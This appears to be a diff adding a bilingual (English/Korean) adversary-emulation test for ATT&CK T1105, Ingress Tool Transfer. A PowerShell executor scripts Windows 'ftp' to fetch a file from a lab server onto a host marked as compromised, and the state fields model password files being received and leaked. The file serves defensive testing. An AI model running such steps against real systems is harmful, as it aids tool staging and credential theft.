@@ -1,0 +1,95 @@
+attack_technique: T1105
+display_name: Ingress Tool Transfer 
+category:
+    - Command and Control
+progress: Complete
+atomic_tests:
+    - name: Download file from ftp server
+      description: |
+        English : Download file from ftp server
+
+        Korean : 
+        ftp 서버에서 파일 다운로드하는 기법
+
+         - Execute : ftp 서버에서 파일 다운로드
+         - Pre : 필요 없음
+         - Input :  ftpserverip, 다운로드 받을 이름, 다운로드 파일이 저장될 경로, 실행 결과가 저장될 경로
+         - dependencies: 필요 없음
+         - Output : 실행 결과 파일
+         - Post : 실행 결과파일 확인
+      
+        # 해당 테크닉으로 모든 파일을 수신할 수 있으나
+        # PPS 정의를 위해 해당 테크닉은 password 파일 관련으로만 사용한다. 
+
+      supported_platforms:
+        - windows
+      pre:
+        prepare_executor_name: ""
+        command: ""
+      input_arguments:
+        ftpServerIp:
+            description: FTP Server IP
+            type: Url
+            default: 192.168.102.15
+        download_file_name:
+            description: Output File
+            type: Path
+            default: 'test.txt'
+        download_dic_path:
+            description: Output File
+            type: Path
+            default: '$env:temp/T1105'
+        output_file:
+            description: Output File
+            type: Path
+            default: '$env:temp/T1105\T1105@20_output.txt'
+      dependency_executor_name: manual
+      dependencies:
+        - description: |
+            ftp client must exist on disk 
+          prereq_command: |
+            if (Test-Path "ftp") {exit 0} else {exit 1}
+          get_prereq_command: |
+            echo "windows ftp client install"
+      executor:
+        name: powershell
+        command: |
+            New-Item -ItemType Directory #{download_dic_path} -Force | Out-Null
+            echo "lcd #{download_dic_path}" > #{output_file}
+            echo "get #{download_file_name}" >> #{output_file}
+            echo "bye" >> #{output_file}
+            ftp -invA -s:#{output_file} #{ftpServerIp} >> #{output_file}
+            cat #{output_file}
+      output:
+        output_executor_name: powershell
+        command: |
+            cat #{output_file}
+      post:
+        post_executor_name: powershell
+        command: |
+            $result = cat#{output_file} | findstr /C:"The system cannot find the file specified."
+            if ($result -eq $null) { exit 0 } else { exit 1 }
+      technique_remote: True
+      source:
+        pre_state: 
+          - Compromised : True
+          - OS_type : Windows
+          - OS_status : Running
+          - FTP_s : Not Unavailable
+        post_state: 
+          - Password : True
+          - Password_s : Received
+          - Password_a : Read, Write, Execute
+          - Password_i : Dest-id
+      dest:
+        pre_state:
+          - Reachable : True
+          - Discovered : True
+          - FTP : True 
+          - FTP_s : Running
+          - Password : True
+          - Password_s : Dumped or Received
+          - Password_a : Read
+        post_state:
+          - Password_s : Leaked
+
